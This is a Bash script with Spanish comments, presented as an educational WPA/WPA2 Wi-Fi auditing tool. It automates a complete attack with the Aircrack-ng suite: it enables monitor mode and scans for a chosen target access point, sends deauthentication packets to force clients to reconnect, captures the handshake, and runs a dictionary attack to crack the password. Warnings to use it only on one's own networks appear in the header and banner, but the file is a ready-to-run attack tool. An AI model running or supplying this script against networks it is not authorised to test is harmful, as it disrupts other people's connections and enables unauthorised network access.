#!/bin/bash

# ###############################################################################
#                             WifiAudit.sh
#  Herramienta educativa para auditar la seguridad de redes Wi-Fi WPA/WPA2.
#          ÚSESE ÚNICAMENTE EN REDES DE TU PROPIEDAD Y CON PERMISO.
# ###############################################################################

# --- Colores para la Salida ---
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
NC="\033[0m" # Sin Color

# --- Comprobación de Privilegios ---
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Este script debe ser ejecutado como root.${NC}" 
   exit 1
fi

# --- Comprobación de Herramientas Necesarias ---
if ! command -v airmon-ng &> /dev/null || ! command -v airodump-ng &> /dev/null || ! command -v aircrack-ng &> /dev/null; then
    echo -e "${RED}[!] La suite Aircrack-ng no está instalada. Por favor, instálala con 'sudo apt install aircrack-ng'.${NC}"
    exit 1
fi

# --- Función de Limpieza (se ejecuta al salir con Ctrl+C) ---
function cleanup {
    echo -e "\n${YELLOW}[*] Limpiando y deteniendo el modo monitor...${NC}"
    airmon-ng stop $monitor_interface &> /dev/null
    rm -f capture-* # Elimina los archivos de captura
    echo -e "${GREEN}[+] Hecho.${NC}"
}
trap cleanup EXIT # Ejecuta la función 'cleanup' cuando el script termina

# --- Inicio del Script ---
clear
echo -e "${BLUE}==============================================${NC}"
echo -e "${BLUE}==         Herramienta de Auditoría Wi-Fi   ==${NC}"
echo -e "${BLUE}==           (Propósitos Educativos)        ==${NC}"
echo -e "${BLUE}==============================================${NC}"
echo -e "${RED}ADVERTENCIA: No uses esta herramienta en redes ajenas.${NC}\n"

# --- Selección de la Interfaz ---
echo -e "${YELLOW}[*] Detectando interfaces de red inalámbricas...${NC}"
iwconfig | grep "IEEE" | awk '{print $1}'
echo ""
read -p "Introduce el nombre de tu interfaz de red inalámbrica (ej: wlan0): " interface

# --- Poner la Tarjeta en Modo Monitor (Fase 1) ---
echo -e "\n${YELLOW}[*] Iniciando modo monitor en ${interface}...${NC}"
monitor_interface=$(airmon-ng start $interface | grep "monitor mode enabled on" | awk '{print $5}' | sed 's/)//')

if [[ -z "$monitor_interface" ]]; then
    echo -e "${RED}[!] No se pudo iniciar el modo monitor. Asegúrate de que la interfaz es correcta y no está en uso.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Modo monitor iniciado en: ${monitor_interface}${NC}"

# --- Escaneo de Redes (Fase 2) ---
echo -e "\n${YELLOW}[*] Escaneando redes. Presiona Ctrl+C cuando veas tu red objetivo...${NC}"
sleep 2
airodump-ng $monitor_interface

# --- Recopilación de Datos del Objetivo ---
echo ""
read -p "Introduce el BSSID (MAC) del punto de acceso objetivo: " bssid
read -p "Introduce el canal del punto de acceso objetivo: " channel

# --- Captura del Handshake (Fase 3) ---
echo -e "\n${YELLOW}[*] Escuchando en el canal ${channel} para capturar el handshake de ${bssid}...${NC}"
echo -e "${YELLOW}[*] Se intentará desconectar a un cliente para forzar el handshake.${NC}"
echo -e "${YELLOW}[*] Esperando... (Esto puede tardar unos minutos). Cuando veas '[ WPA handshake: ... ]' en la esquina superior derecha, puedes presionar Ctrl+C en esta ventana.${NC}"

# Se inician dos procesos en paralelo:
# 1. airodump-ng para escuchar y guardar la captura en un archivo llamado 'capture'.
# 2. aireplay-ng para enviar paquetes de desautenticación y forzar la reconexión.
gnome-terminal -- /bin/bash -c "airodump-ng --bssid $bssid -c $channel -w capture $monitor_interface" &
PID_AIRODUMP=$!
sleep 5
aireplay-ng --deauth 10 -a $bssid $monitor_interface
# Esperar a que el usuario termine la captura
wait $PID_AIRODUMP

handshake_file=$(ls -t capture-*.cap 2>/dev/null | head -n1)

if [[ ! -f "$handshake_file" ]]; then
    echo -e "${RED}[!] No se pudo capturar el handshake. Inténtalo de nuevo, asegurándote de que haya dispositivos conectados a la red.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] Handshake capturado y guardado en: ${handshake_file}${NC}"

# --- Ataque por Diccionario (Fase 4) ---
echo ""
read -p "Introduce la ruta completa a tu lista de palabras (wordlist): " wordlist

if [[ ! -f "$wordlist" ]]; then
    echo -e "${RED}[!] El archivo de wordlist no existe en esa ruta.${NC}"
    exit 1
fi

echo -e "\n${YELLOW}[*] Iniciando ataque de diccionario con aircrack-ng...${NC}"
echo -e "${YELLOW}[*] Esto puede tardar mucho tiempo, dependiendo del tamaño de la wordlist y la complejidad de la contraseña.${NC}"

aircrack-ng -w $wordlist -b $bssid $handshake_file